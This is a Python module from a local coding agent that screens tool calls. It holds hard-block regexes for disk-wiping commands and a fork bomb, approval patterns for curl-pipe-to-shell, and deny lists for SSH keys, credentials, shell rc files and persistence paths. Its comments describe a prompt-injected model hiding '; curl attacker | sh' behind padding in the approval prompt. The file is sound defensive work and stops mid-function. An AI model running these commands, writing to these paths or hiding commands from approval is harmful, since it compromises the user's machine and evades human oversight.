"""Loop-adjacent helpers.

Pulled out of agent/__init__.py during T0.1-e. The seven functions
here aren't state machines or policy — they're "the loop needs to do
this one small thing" utilities that were crowding the file.

Grouped into three conceptual buckets (kept in one file because
they're all called exclusively by the loop and none is worth its own
module yet):

  1. Tool dispatch plumbing — `_execute_tool`, `_first_token`,
     `_needs_confirmation`. These turn a parsed tool call + args
     into a result string, gating destructive commands on user
     approval via DESTRUCTIVE_PATTERNS.

  2. Display / summary formatting — `_render_markdown`,
     `_brief_result`, `_grounded_file_summary`. These shape text
     for user display (final answers rendered as Markdown; tool
     results briefly summarised for progress logs; file-change
     lists rendered with line counts after the turn).

  3. Progress-indicator label — `_tool_stage_label`. Returns the
     short human phrase the TUI shows while a tool is running
     ("writing foo.py", "running command", "searching code").

Pure helpers. No hidden state. Loop imports them by name.
"""
from __future__ import annotations

import sys
from pathlib import Path
from typing import TYPE_CHECKING

from rich.console import Console
from rich.markdown import Markdown
from rich.padding import Padding

from .constants import DESTRUCTIVE_PATTERNS
from ..tools import ToolContext, ToolResult, dispatch_result as _tools_dispatch_result

if TYPE_CHECKING:
    from ..app import LocalCodeApp
    from ..output import OutputManager


# Helpers here are underscore-prefixed internal utilities the loop
# uses. `__all__` is empty deliberately — nothing here is a public
# contract. If a helper should be public later, rename without the
# leading underscore and add it here.
__all__: list[str] = []


_SHRINK_GUARD_SOURCE_EXTS = {".py", ".js", ".jsx", ".ts", ".tsx", ".css", ".html"}


# ── Autonomy-independent safety hard-block ─────────────────────────────
#
# The approval gate (_needs_confirmation) is a *confirmation* layer: it is
# skipped in FULL_AUTO and in headless mode (which forces full_auto). That
# left no backstop at all for those modes — a prompt-injected model could
# run `curl … | sh` via bash OR background_process, or overwrite
# ~/.ssh/authorized_keys via write_file, entirely unattended. This layer
# runs before EVERY dispatch regardless of autonomy level or headless, and
# cannot be overridden. It blocks only unambiguously destructive operations
# (no legitimate agent use), so it does not add friction to normal work.

# Tools that hand a raw string to a shell.
_SHELL_EXEC_TOOLS = {"bash", "background_process"}
# Tools that write file contents to a path.
_FILE_WRITE_TOOLS = {"write_file", "append_file", "edit_file", "multi_edit", "edit_diff"}

# Built-in tools that never prompt: read-only, or internally guarded
# (the `agent` tool routes every inner call back through this gate).
# Everything NOT on this list — and not a shell/write tool, which have
# their own richer gating below — is confirmed before it runs. That
# inverts the old default-allow, which let `launch_app` (executes a
# command the REPO controls via package.json scripts) and any
# third-party `mcp_*` tool run unattended in every mode including
# suggest. Mirrors the default-ASK posture permissions_v2 documents.
_NEVER_CONFIRM_TOOLS = frozenset({
    "read_file", "grep", "glob", "list_files", "code_navigation",
    "inspect_symbol", "todo_write", "current_datetime",
    "web_search", "web_fetch", "skill", "agent",
    "enter_plan_mode", "exit_plan_mode",
    "read_state", "facts", "project_check", "syntax_check",
})

# Credential / key material that the agent has no legitimate reason to write.
# Matched on the path BASENAME or a path SEGMENT (never a naive substring, so
# editing the project's own `tokenizer.py` / `api_keys.py` is never blocked).
_BLOCKED_WRITE_BASENAMES = frozenset({
    "id_rsa", "id_dsa", "id_ecdsa", "id_ed25519",
    "authorized_keys", "known_hosts",
    ".netrc", ".npmrc", ".pypirc",
    "credentials", "credentials.json",
    "shadow", "passwd", "sudoers",
    # Shell startup files. Writing any of these is persistent code execution
    # on the user's next shell — there is no legitimate agent reason to do it,
    # and `~/.zshrc` was not covered by anything before.
    ".zshrc", ".zshenv", ".zprofile", ".zlogin", ".zlogout",
    ".bashrc", ".bash_profile", ".bash_login", ".bash_logout",
    ".profile", ".kshrc", ".cshrc", ".tcshrc", ".inputrc",
    # LocalCode's own machine-wide config. `mcp.json` is the worst case: the
    # agent writes an MCP server `command`, which is then SPAWNED on the next
    # launch — persistent RCE from a single silent file write.
    "mcp.json",
})
_BLOCKED_WRITE_SEGMENTS = frozenset({
    ".ssh", ".aws", ".gnupg", ".config/gcloud",
    # macOS persistence: a plist dropped here is launched by launchd.
    "launchagents", "launchdaemons",
    # systemd user units are the Linux equivalent.
    "systemd",
})

# Home-relative directories whose contents are off-limits regardless of the
# file's own name: ~/.localcode holds config.toml + mcp.json (both executed on
# next launch). Subtrees that are legitimate agent workspace are re-allowed.
_BLOCKED_HOME_DIRS = ("~/.localcode",)
_BLOCKED_HOME_DIR_EXEMPT_SUBDIRS = ("plans", "notebook", "sessions", "test-results")


def _is_git_hook_path(parts: tuple[str, ...]) -> bool:
    """True for `<anything>/.git/hooks/<file>`.

    Adjacency is required: a project directory literally named `hooks/` (very
    common — webhook handlers, git-hook SOURCE templates) is not blocked, only
    the live `.git/hooks/` directory git actually executes.
    """
    lowered = [part.lower() for part in parts]
    for i in range(len(lowered) - 1):
        if lowered[i] == ".git" and lowered[i + 1] == "hooks":
            return True
    return False


def _is_blocked_home_config_path(p: Path) -> bool:
    """True for writes into ~/.localcode outside its workspace subdirs."""
    for raw_dir in _BLOCKED_HOME_DIRS:
        base = Path(raw_dir).expanduser()
        try:
            rel = p.resolve().relative_to(base.resolve())
        except (ValueError, OSError):
            try:
                rel = p.relative_to(base)
            except ValueError:
                continue
        if rel.parts and rel.parts[0] in _BLOCKED_HOME_DIR_EXEMPT_SUBDIRS:
            continue
        return True
    return False


def _is_blocked_write_path(raw_path: str) -> bool:
    """True if writing this path targets credential/key material, a shell
    startup file, an OS persistence hook, or LocalCode's own machine config.

    Precise matching only: exact basename, exact path segment, or an exact
    directory relationship. A file named `tokenizer.py` or `password_reset.py`
    in the project is NOT blocked, nor is a project's own `hooks/` directory.
    """
    if not raw_path:
        return False
    try:
        p = Path(raw_path).expanduser()
    except Exception:
        p = Path(raw_path)
    name = p.name.lower()
    if name in _BLOCKED_WRITE_BASENAMES:
        return True
    lowered_parts = {part.lower() for part in p.parts}
    if lowered_parts & _BLOCKED_WRITE_SEGMENTS:
        return True
    if _is_git_hook_path(p.parts):
        return True
    if _is_blocked_home_config_path(p):
        return True
    return False


# Catastrophic shell commands with NO legitimate agent use — hard-blocked in
# every mode, never overridable. Deliberately TIGHT: these are anchored to real
# device/root/home targets so they don't false-positive on a `grep` for the
# text. "High-risk but sometimes legitimate" commands (curl|sh installs,
# force-push, sudo rm) are NOT here — they route through the confirmation gate
# instead (see _CONFIRM_SHELL_RE), so the user can approve them.
#
# NB: SQL patterns (DROP TABLE, DELETE FROM, …) are intentionally absent — bash
# does not execute SQL, so blocking them here only broke `grep "DROP TABLE"`.
import re as _re

_HARD_BLOCK_SHELL_RE = [
    _re.compile(r"\brm\s+-[a-z]*r[a-z]*f[a-z]*\s+(/|~|\$HOME|\$\{HOME\})(\s|/|$)", _re.I),
    _re.compile(r"\brm\s+-[a-z]*f[a-z]*r[a-z]*\s+(/|~|\$HOME|\$\{HOME\})(\s|/|$)", _re.I),
    _re.compile(r"\bmkfs\b", _re.I),
    _re.compile(r"\bdd\b[^\n]*\bof=/dev/", _re.I),
    _re.compile(r">\s*/dev/(sd|nvme|hd|disk|vd)", _re.I),
    _re.compile(r"\bchmod\s+-R\s+0*777\s+/(\s|$)", _re.I),
    _re.compile(r":\s*\(\s*\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:", _re.I),  # fork bomb
    _re.compile(r">\s*/etc/", _re.I),
    _re.compile(r"\bwipefs\b", _re.I),
]

# High-risk-but-sometimes-legitimate shell: prompt for approval (overridable),
# never silently run and never hard-blocked. Anchored so a `grep` for the text
# doesn't trigger it: the pipe-to-shell must be a real pipeline, force-push a
# real git invocation.
_CONFIRM_SHELL_RE = _re.compile(
    r"(?:\b(?:curl|wget)\b[^\n|]*\|\s*(?:sudo\s+)?(?:ba|z|k|da)?sh\b)"
    r"|(?:\bgit\s+push\b[^\n]*(?:--force\b|-f\b))"
    r"|(?:\bsudo\s+rm\b)"
    r"|(?:\bgit\s+reset\s+--hard\s+origin\b)",
    _re.I,
)


def _safety_hard_block(name: str, args: dict, repo_root: "Path | str | None" = None) -> str | None:
    """Autonomy-independent hard block. Returns a rejection reason, or None.

    Runs before every tool dispatch in ALL modes (including FULL_AUTO and
    headless). Covers only operations with no legitimate agent use:
      - catastrophic shell (rm -rf /, mkfs, dd of=/dev/…, > /dev/sd*, fork
        bomb, chmod -R 777 /, > /etc/) — see _HARD_BLOCK_SHELL_RE
      - writes to SSH/AWS/GPG key material or credential files
      - writes to shell startup files (~/.zshrc &c), OS persistence hooks
        (LaunchAgents, systemd units, .git/hooks), and ~/.localcode config
        (mcp.json defines commands that get SPAWNED on next launch)
    Everything else — including curl|sh and force-push — falls through to the
    normal confirmation flow, which can approve it.
    """
    if name in _SHELL_EXEC_TOOLS:
        cmd = str(args.get("command", "") or "")
        if cmd:
            for rx in _HARD_BLOCK_SHELL_RE:
                if rx.search(cmd):
                    return "blocked: refusing a command that could destroy the disk or system (matched a catastrophic pattern)"
    if name == "launch_app":
        # launch_app hands the repo's own package.json script (or an
        # inferred command) to `sh`. The string is repo-controlled, so it
        # gets the same catastrophic-pattern screen as bash — resolved to
        # the concrete command that would actually run.
        action = str(args.get("action") or "start").strip().lower()
        if action != "stop" and repo_root is not None:
            command, _root, script = _resolve_launch_details(repo_root)
            for text in (command, script):
                if not text:
                    continue
                for rx in _HARD_BLOCK_SHELL_RE:
                    if rx.search(text):
                        return (
                            "blocked: the repo's launch command matched a "
                            "catastrophic pattern and will not be executed"
                        )
    if name in _FILE_WRITE_TOOLS:
        raw_path = str(args.get("path", "") or args.get("file_path", "") or "")
        if raw_path:
            # The agent's sanctioned scratch dir is exempt.
            try:
                from ..notebook import is_within_notebook
                if is_within_notebook(Path(raw_path).expanduser()):
                    return None
            except Exception:
                pass
            if _is_blocked_write_path(raw_path):
                return (
                    "blocked: refusing to write credential/key material, a shell "
                    "startup file, an OS persistence hook, or LocalCode's own "
                    f"machine config ({Path(raw_path).name})"
                )
    return None


# ── Plan-mode enforcement ──────────────────────────────────────────────
#
# plans.py PROMISES the user that plan mode allows exactly one write (the
# plan file) and forbids edits and destructive bash; features.py documents
# PLAN_MODE as a read-only overlay. Until this layer existed the flag was
# advisory: `app.plan_mode` was set by the enter tool and read by nothing
# else, so a model in plan mode could rewrite the repo unchallenged.
#
# Shell is not blanket-blocked, because plan mode's whole job is exploring
# the codebase. Instead every pipeline segment's leading token must be on
# this read-only list, and redirections are refused outright — so `grep -rn
# foo | head` runs while `rm -rf build`, `git push`, and `echo x > f` do not.
_PLAN_MODE_READONLY_CMDS = frozenset({
    "ls", "cat", "head", "tail", "wc", "file", "stat", "du", "df",
    "grep", "rg", "egrep", "fgrep", "find", "fd", "tree", "which", "type",
    "awk", "sed", "sort", "uniq", "cut", "tr", "jq", "diff", "basename",
    "dirname", "realpath", "pwd", "echo", "date", "env", "printenv",
    "git", "python3", "python", "node", "true", "false",
})
# `git` is allowed above for exploration only — these subcommands mutate.
_PLAN_MODE_GIT_BLOCKED = frozenset({
    "push", "commit", "merge", "rebase", "reset", "checkout", "switch",
    "clean", "apply", "am", "cherry-pick", "revert", "restore", "rm", "mv",
    "add", "stash", "tag", "branch", "fetch", "pull", "clone", "init",
    "submodule", "worktree", "gc", "filter-branch",
})


def _plan_mode_shell_rejection(cmd: str) -> str | None:
    """Reject a shell command that would mutate state while planning."""
    text = (cmd or "").strip()
    if not text:
        return None
    if ">" in text or "`" in text or "$(" in text:
        return "redirection or command substitution is not allowed in plan mode"
    import re as _re_local
    for segment in _re_local.split(r"[;&|\n]+", text):
        seg = segment.strip()
        if not seg:
            continue
        tokens = seg.split()
        head = tokens[0].lower()
        head = head.rsplit("/", 1)[-1]
        if head not in _PLAN_MODE_READONLY_CMDS:
            return f"`{head}` is not a read-only command"
        if head == "git":
            sub = next((t for t in tokens[1:] if not t.startswith("-")), "").lower()
            if sub in _PLAN_MODE_GIT_BLOCKED:
                return f"`git {sub}` mutates the repository"
    return None


def _plan_mode_block(app: "LocalCodeApp", name: str, args: dict) -> str | None:
    """Enforce plan mode. Returns a rejection reason, or None.

    One write is permitted: `write_file` targeting the current session's
    plan file. Everything else in `_FILE_WRITE_TOOLS` is refused, and shell
    is limited to read-only exploration (see `_plan_mode_shell_rejection`).
    """
    if not getattr(app, "plan_mode", False):
        return None
    if name in _FILE_WRITE_TOOLS:
        raw_path = str(args.get("path", "") or args.get("file_path", "") or "")
        slug = getattr(app, "plan_slug", None)
        if name == "write_file" and raw_path and slug:
            try:
                from ..plans import plan_path
                candidate = Path(raw_path).expanduser()
                if not candidate.is_absolute():
                    candidate = Path(app.repo_root) / candidate
                if candidate.resolve() == Path(plan_path(slug)).resolve():
                    return None
            except Exception:
                pass
        target = f" ({Path(raw_path).name})" if raw_path else ""
        return (
            f"plan mode is active — `{name}`{target} is not allowed. The plan "
            "file is the only write permitted while planning. Finish the plan "
            "and call exit_plan_mode before changing any code."
        )
    if name in _SHELL_EXEC_TOOLS:
        if name != "bash":
            return (
                f"plan mode is active — `{name}` is not allowed. Use read-only "
                "shell commands to explore, then call exit_plan_mode."
            )
        reason = _plan_mode_shell_rejection(str(args.get("command", "") or ""))
        if reason:
            return (
                f"plan mode is active and this command is not read-only: {reason}. "
                "Explore with read-only commands, then call exit_plan_mode before "
                "changing anything."
            )
    return None


def _path_within(path: Path, root: Path) -> bool:
    try:
        path.resolve().relative_to(root)
        return True
    except ValueError:
        return False
    except Exception:
        return False


def _reject_noncanonical_creation_write(app: "LocalCodeApp", raw_path: str) -> str | None:
    # Project naming is a model/user decision. Earlier versions forced every
    # new-app write into an internal task slug; that over-constrained builds
    # and produced weird repeated folder names. Keep the helper as a no-op so
    # the rest of the write-guard pipeline remains stable.
    return None


def _should_reject_destructive_write(path: Path, content: str) -> str | None:
    """Reject suspicious full-file rewrites that collapse real source files.

    Failure pattern from events.jsonl:
    - existing app source file is 100+ lines
    - model uses write_file, not edit_file
    - new content is a tiny 8-line shell
    - tool succeeds, but the app regresses badly

    Keep this narrow: only existing source files, only severe shrinkage.
    """
    if not path.exists() or not path.is_file():
        return None
    if path.suffix.lower() not in _SHRINK_GUARD_SOURCE_EXTS:
        return None
    try:
        old_text = path.read_text(errors="replace")
    except Exception:
        return None
    old_lines = len(old_text.splitlines())
    new_lines = len(content.splitlines())
    if old_lines < 60:
        return None
    if new_lines > 20:
        return None
    if new_lines >= max(12, old_lines // 5):
        return None
    return (
        f"REJECTED: write_file would collapse {path.name} from {old_lines} lines to "
        f"{new_lines} lines. This looks like an accidental destructive rewrite. "
        f"Read the file and use edit_file or multi_edit for a targeted change. "
        f"Only do a full rewrite if the user explicitly asked for one."
    )


def _should_reject_destructive_multi_edit(path: Path, edits: object) -> str | None:
    """Reject multi_edit calls that effectively replace a whole file with
    a tiny stub. Same protection as write_file, but simulated before the
    tool mutates disk.
    """
    if not path.exists() or not path.is_file():
        return None
    if path.suffix.lower() not in _SHRINK_GUARD_SOURCE_EXTS:
        return None
    if not isinstance(edits, list) or not edits:
        return None
    try:
        old_text = path.read_text(errors="replace")
    except Exception:
        return None
    old_lines = len(old_text.splitlines())
    if old_lines < 60:
        return None

    content = old_text
    replaced_lines = 0
    for edit in edits:
        if not isinstance(edit, dict):
            return None
        old = edit.get("old_string", "")
        new = edit.get("new_string", "")
        if not isinstance(old, str) or not isinstance(new, str) or not old:
            return None
        if content.count(old) != 1:
            return None
        replaced_lines += len(old.splitlines())
        content = content.replace(old, new, 1)

    new_lines = len(content.splitlines())
    replaced_ratio = replaced_lines / max(old_lines, 1)
    if new_lines > 20:
        return None
    if new_lines >= max(12, old_lines // 5):
        return None
    if replaced_ratio < 0.75:
        return None
    return (
        f"REJECTED: multi_edit would collapse {path.name} from {old_lines} "
        f"lines to {new_lines} lines after replacing {replaced_lines} lines. "
        "This looks like an accidental destructive rewrite. Use smaller "
        "targeted edits, or ask before doing an explicit full-file replacement."
    )


def _execute_tool_result(app: "LocalCodeApp", name: str, args: dict, out: "OutputManager") -> ToolResult:
    """Execute a single tool and return the result string.

    Routes through src/localcode/tools/{name}.py via tools.dispatch, with two
    wrapping policy layers: the autonomy-independent safety hard-block, and
    the plan-mode policy layer that refuses writes (other than the plan file)
    and non-read-only shell while the agent is in plan-explore mode.
    """
    # Autonomy-independent safety hard-block. Runs FIRST, in every mode
    # (including FULL_AUTO / headless), and cannot be overridden — this is the
    # backstop the confirmation gate is not. A prompt-injected model cannot use
    # bash/background_process to run `curl|sh` or wipe a disk, nor a write tool
    # to overwrite ~/.ssh/authorized_keys, even with no human present.
    _blocked = _safety_hard_block(name, args, repo_root=getattr(app, "repo_root", None))
    if _blocked is not None:
        try:
            from ..events import emit as _emit_block
            _emit_block("safety_hard_block", tool=name, reason=str(_blocked)[:200])
        except Exception:
            pass
        return ToolResult(
            text=f"REJECTED: {_blocked}. This operation is blocked by the safety layer and cannot be auto-approved.",
            ok=False,
            facts={"tool": name, "ok": False, "safety_blocked": True},
        )

    # Plan-mode policy. Runs next, before any hook or tool work, so the
    # promise plans.py makes to the user ("the ONE write allowed in plan
    # mode") is actually true.
    _plan_blocked = _plan_mode_block(app, name, args)
    if _plan_blocked is not None:
        try:
            from ..events import emit as _emit_plan
            _emit_plan("plan_mode_block", tool=name, reason=str(_plan_blocked)[:200])
        except Exception:
            pass
        return ToolResult(
            text=f"REJECTED: {_plan_blocked}",
            ok=False,
            facts={"tool": name, "ok": False, "plan_mode_blocked": True},
        )

    try:
        hook = getattr(app, "hooks", None)
        decision = hook.on_pre_tool_use(name, args) if hook is not None else None
        if decision is not None and decision.blocked:
            reason = decision.error or decision.output or "pre-tool hook blocked"
            return ToolResult(text=f"REJECTED: {reason}", ok=False, facts={"tool": name, "ok": False, "hook_blocked": True})
    except Exception:
        pass

    # Lint-gate: for source-file writes/edits, snapshot the file before the
    # tool runs so we can auto-revert on syntax-break. Motivation: the model
    # at 2-bit quant has been observed to delete import statements during
    # "clean up" edits, corrupting working code. A failed parse after the
    # edit means the model made a destructive mistake — undo it before the
    # next round runs the broken file.
    _lintable_exts = (".py", ".js", ".ts", ".tsx", ".jsx", ".json")
    _lint_tools = {"write_file", "append_file", "edit_file", "multi_edit", "edit_diff"}
    target_path: Path | None = None
    snapshot_bytes: bytes | None = None
    if name in _lint_tools:
        raw_path = args.get("path") or ""
        if raw_path:
            canonical_rejection = _reject_noncanonical_creation_write(app, str(raw_path))
            if canonical_rejection:
                return ToolResult(
                    text=canonical_rejection,
                    ok=False,
                    facts={"tool": name, "ok": False, "path": str(raw_path), "canonical_path": False},
                )
            p = app.repo_root / raw_path if not Path(raw_path).is_absolute() else Path(raw_path)
            if p.suffix.lower() in _lintable_exts and p.exists():
                try:
                    snapshot_bytes = p.read_bytes()
                    target_path = p
                except Exception:
                    snapshot_bytes = None
                    target_path = None

    if name == "write_file":
        raw_path = args.get("path") or ""
        if raw_path and "content" in args:
            p = app.repo_root / raw_path if not Path(raw_path).is_absolute() else Path(raw_path)
            rejection = _should_reject_destructive_write(p, str(args.get("content", "")))
            if rejection:
                return ToolResult(text=rejection, ok=False, facts={"tool": name, "ok": False, "path": str(raw_path)})
    elif name == "multi_edit":
        raw_path = args.get("path") or ""
        if raw_path:
            p = app.repo_root / raw_path if not Path(raw_path).is_absolute() else Path(raw_path)
            rejection = _should_reject_destructive_multi_edit(p, args.get("edits"))
            if rejection:
                return ToolResult(text=rejection, ok=False, facts={"tool": name, "ok": False, "path": str(raw_path)})

    try:
        result = _tools_dispatch_result(name, ToolContext(app=app, out=out), args)
    except Exception as e:
        text = f"Error in {name}: {type(e).__name__}: {e}"
        try:
            if getattr(app, "hooks", None) is not None:
                app.hooks.on_post_tool_use(name, args, text, error=True)
        except Exception:
            pass
        return ToolResult(text=text, ok=False, facts={"tool": name, "ok": False, "error_type": type(e).__name__})

    try:
        if getattr(app, "hooks", None) is not None:
            app.hooks.on_post_tool_use(name, args, result.text, error=not result.ok)
    except Exception:
        pass

    if target_path is not None and target_path.exists() and target_path.suffix == ".py":
        # Python: ast.parse is cheap and authoritative.
        import ast as _ast
        try:
            _ast.parse(target_path.read_text(errors="replace"))
        except SyntaxError as se:
            if snapshot_bytes is not None:
                target_path.write_bytes(snapshot_bytes)
            text = (
                f"REJECTED: the edit broke Python syntax in {target_path.name} "
                f"({se.msg} at line {se.lineno}). File was reverted. "
                "Re-read the file and try a more targeted change — don't delete "
                "import statements, function defs, or class headers unless the "
                "user explicitly asked."
            )
            return ToolResult(text=text, ok=False, facts={"tool": name, "ok": False, "path": str(target_path), "reverted": True})
    if name in _lint_tools:
        try:
            if getattr(app, "hooks", None) is not None:
                app.hooks.on_post_edit(str(args.get("path", "")), result.text, error=not result.ok)
        except Exception:
            pass
    return result


def _execute_tool(app: "LocalCodeApp", name: str, args: dict, out: "OutputManager") -> str:
    return _execute_tool_result(app, name, args, out).text

def _first_token(cmd: str) -> str:
    """Leading command word, used as the key for per-session "always allow"
    whitelisting. `git push ...` → "git", `pip install ...` → "pip".
    """
    return (cmd.strip().split() or [""])[0][:20].lower()


def _resolve_launch_details(repo_root: "Path | str") -> tuple[str, str, str]:
    """(command, root, underlying_script) `launch_app` would run, or ('','','').

    Resolved via the launcher's own detection so the approval prompt and
    the hard-block screen see the SAME repo-controlled strings the tool
    would execute ("{port}" stays as a placeholder — the launcher fills
    in a free localhost port at start time). For npm wrappers the command
    is just `npm run dev …` — the ACTUAL repo-controlled payload is the
    package.json script body, so that is resolved too: it must be shown
    to the user and screened by the hard block.
    """
    try:
        from ..launcher import detect_launch_candidate
        candidate = detect_launch_candidate(repo_root)
    except Exception:
        return "", "", ""
    if candidate is None:
        return "", "", ""
    script = ""
    try:
        import json as _json
        manifest = candidate.root / "package.json"
        if candidate.command.startswith("npm ") and manifest.is_file():
            data = _json.loads(manifest.read_text(errors="replace"))
            scripts = data.get("scripts") if isinstance(data, dict) else None
            if isinstance(scripts, dict):
                key = "dev" if "npm run dev" in candidate.command else "start"
                script = str(scripts.get(key, "") or "")
    except Exception:
        script = ""
    return candidate.command, str(candidate.root), script


def _approval_display_command(app: "LocalCodeApp | None", name: str, args: dict) -> str:
    """Build the string the approval prompt shows (and keys "always allow" on).

    Shell tools carry a command; file-write tools carry a path. `launch_app`
    carries NEITHER — its command comes from the repo's own manifest — so the
    prompt must resolve and show that real command, not a blank line. MCP
    tools show the tool name plus an args preview.
    """
    cmd = str(args.get("command", "") or "")
    if cmd:
        return cmd
    if name == "launch_app":
        action = str(args.get("action") or "start").strip().lower()
        if action == "stop":
            return "launch_app stop (SIGTERM the app process this session started)"
        repo = getattr(app, "repo_root", None)
        resolved, root, script = _resolve_launch_details(repo) if repo is not None else ("", "", "")
        if resolved:
            suffix = f"  (cwd: {root})" if root else ""
            # For npm wrappers, show the script body too — THAT is the
            # repo-controlled command the user is actually approving.
            if script:
                suffix += f'  [script: {script}]'
            return f"launch_app {resolved}{suffix}"
        return "launch_app (no launch command detected)"
    path = str(args.get("path") or args.get("file_path") or "")
    if not path and name.startswith("mcp_"):
        try:
            import json as _json
            preview = _json.dumps(args, ensure_ascii=False, default=str)[:200]
        except Exception:
            preview = str(args)[:200]
        return f"{name} {preview}".strip()
    return f"{name} {path}".strip()


def _render_approval_command(cmd: str, width: int = 76, max_chars: int = 1500) -> list[str]:
    """Prepare a command for the CLI approval prompt: escape control
    characters and wrap the FULL text across lines.

    The old rendering was `cmd[:80]` raw: everything past column 80 was
    invisible at approval time, and the model controls the padding — so
    `git status <60 spaces> ; curl attacker | sh` displayed as a bare
    `git status`. Raw control characters could also repaint the line
    (`\\r`, cursor moves) to hide the tail. Every character is now either
    shown or explicitly counted in a truncation marker.
    """
    text = str(cmd or "")
    hidden = max(0, len(text) - max_chars)
    if hidden:
        text = text[:max_chars]
    safe: list[str] = []
    for ch in text:
        code = ord(ch)
        if ch == "\n":
            safe.append(ch)
        elif code < 0x20 or code == 0x7F:
            safe.append(f"\\x{code:02x}")
        else:
            safe.append(ch)
    lines: list[str] = []
    for raw_line in "".join(safe).split("\n"):
        if not raw_line:
            lines.append("")
            continue
        for i in range(0, len(raw_line), width):
            lines.append(raw_line[i:i + width])
    if hidden:
        lines.append(f"… [+{hidden} more characters not shown]")
    return lines

def _needs_confirmation(name: str, args: dict, app: "LocalCodeApp | None" = None) -> bool:
    """Check if this tool needs user confirmation.

    Honors the app's current autonomy level — FULL_AUTO bypasses confirmation
    even for destructive patterns. This is checked PER-CALL so toggling
    /permissions mid-task takes effect immediately.

    Also honors the per-session "always allow" set built up when the user
    picks option 2 on a prompt ("always allow `git`"). That set is on
    `app._session_allow` — scoped to this process, cleared on next launch.
    """
    # Leaving plan mode drops the read-only overlay, and the plan-mode prompt
    # tells the user exit_plan_mode "will return control to the user for
    # approval" — so it genuinely asks. FULL_AUTO (and headless, which forces
    # it) still skips the prompt via the check below.
    _needs_plan_exit_ack = (
        name == "exit_plan_mode" and bool(getattr(app, "plan_mode", False))
    )

    # Known read-only / internally-guarded built-ins never need confirmation.
    # NOTE the inverted default: a tool that is NOT on the never-confirm list
    # and NOT a shell/write tool (launch_app, any `mcp_*` tool, any unknown
    # freshly-registered tool) falls through and IS confirmed below.
    if (
        not _needs_plan_exit_ack
        and name not in _SHELL_EXEC_TOOLS
        and name not in _FILE_WRITE_TOOLS
        and name in _NEVER_CONFIRM_TOOLS
    ):
        return False

    level = None
    if app is not None:
        try:
            from ..autonomy import AutonomyLevel
            level = getattr(app, "_autonomy", None)
            # FULL_AUTO skips confirmation for everything (the hard-block in
            # _execute_tool_result still applies — it is not an approval).
            if level == AutonomyLevel.FULL_AUTO:
                return False
        except Exception:
            level = None

    if _needs_plan_exit_ack:
        return True

    # launch_app / mcp_* / unknown tools: always confirm on first use.
    # `launch_app` executes a command the REPO controls (package.json
    # scripts.dev/start); `mcp_*` tools belong to third-party servers; an
    # unknown tool is exactly what an injected/compromised registration
    # looks like. A session-scoped "always allow" (option 2 on the prompt)
    # is honoured after the first approval — keyed on the tool name, which
    # is the first token of the display command built by
    # `_approval_display_command`.
    if (
        name not in _SHELL_EXEC_TOOLS
        and name not in _FILE_WRITE_TOOLS
        and name != "exit_plan_mode"
    ):
        # `launch_app stop` runs no repo-controlled command and can only
        # SIGTERM a pid this session spawned — no prompt needed.
        if name == "launch_app" and str(args.get("action") or "").strip().lower() == "stop":
            return False
        if app is not None:
            allow = getattr(app, "_session_allow", None)
            if allow and (name in allow or _first_token(name) in allow):
                return False
        return True

    # File-write tools: auto-approved in auto_edit (the point of that mode);
    # in suggest (read-only) mode every write is confirmed. Notebook scratch
    # writes are never prompted.
    if name in _FILE_WRITE_TOOLS:
        try:
            from ..autonomy import AutonomyLevel
            if level != AutonomyLevel.SUGGEST:
                return False
        except Exception:
            return False
        raw_path = str(args.get("path", "") or args.get("file_path", "") or "")
        if raw_path:
            try:
                from ..notebook import is_within_notebook
                if is_within_notebook(Path(raw_path).expanduser()):
                    return False
            except Exception:
                pass
        return True

    # Shell-executing tools (bash, background_process).
    cmd = args.get("command", "")
    if app is not None:
        allow = getattr(app, "_session_allow", None)
        if allow and _first_token(cmd) in allow:
            return False
    # background_process hands a raw string straight to /bin/sh with no
    # destructive-substring shortcut — always confirm it (unless full_auto or
    # session-allowed above). In suggest mode, confirm any shell command.
    if name == "background_process":
        return True
    try:
        from ..autonomy import AutonomyLevel
        if level == AutonomyLevel.SUGGEST:
            return True
    except Exception:
        pass
    # High-risk-but-sometimes-legit patterns (remote pipe-to-shell, force-push,
    # sudo rm) are NOT hard-blocked — confirm them so the user can approve.
    if _CONFIRM_SHELL_RE.search(cmd):
        return True
    return any(p in cmd for p in DESTRUCTIVE_PATTERNS)

def _request_approval_verdict(app: "LocalCodeApp | None", out: "OutputManager | None",
                              tool_name: str, cmd: str) -> str:
    """Ask the user to approve one tool call. Returns "once" / "always" / "deny".

    Single implementation shared by the main loop and by the sub-agent tool
    (`tools/agent.py`), so a sub-agent can never dispatch a tool the parent
    would have prompted for. Prefers the TUI approval callback; falls back to
    the CLI three-option terminal prompt; denies if neither is usable.
    """
    callback = getattr(out, "_approval_callback", None) if out is not None else None
    if callback is not None:
        raw = callback(tool_name, cmd)
        # Callback may be a bool (legacy) or the new verdict string.
        if isinstance(raw, bool):
            return "once" if raw else "deny"
        return str(raw)

    # CLI mode: terminal-based approval with 3 options.
    import tty
    import termios
    if out is not None:
        try:
            out._stop_indicator()
        except Exception:
            pass
    rule = app._composer_rule() if hasattr(app, "_composer_rule") else "  " + ("─" * 60)
    first_tok = _first_token(cmd) or tool_name
    sys.stdout.write("\n\033[33m  Allow this command?\033[0m\n")
    # Full command, wrapped and control-escaped — never a raw 80-char slice
    # (the TUI path in chat_log.py already wraps; this matches it).
    for _line in _render_approval_command(cmd):
        sys.stdout.write(f"\033[2m  {_line}\033[0m\n")
    sys.stdout.write("  \033[1m1\033[0m  allow once\n")
    sys.stdout.write(f"  \033[1m2\033[0m  always allow `{first_tok}` (this session)\n")
    sys.stdout.write("  \033[1m3\033[0m  deny\n")
    sys.stdout.write("\033[s")
    sys.stdout.write(f"\033[2m{rule}\033[0m\n")
    sys.stdout.write("  › ")
    sys.stdout.write(f"\n\033[2m{rule}\033[0m")
    sys.stdout.write("\033[1A\r    ")
    sys.stdout.flush()
    try:
        fd = sys.stdin.fileno()
        old = termios.tcgetattr(fd)
        try:
            tty.setraw(fd)
            ch = sys.stdin.read(1)
        finally:
            termios.tcsetattr(fd, termios.TCSADRAIN, old)
    except Exception:
        try:
            ch = input().strip()
        except EOFError:
            ch = "3"
    sys.stdout.write("\033[u\033[J")
    if ch in ("1", "y"):
        return "once"
    if ch == "2":
        return "always"
    return "deny"


def _render_markdown(text: str, console: Console | None = None) -> None:
    """Render text as markdown, or plain text for narrow terminals."""
    text = text.strip()
    if not text:
        return
    cols = __import__("shutil").get_terminal_size().columns
    width = cols - 4
    if width < 60:
        # Narrow terminal: just print with indent, no Rich formatting
        for line in text.splitlines():
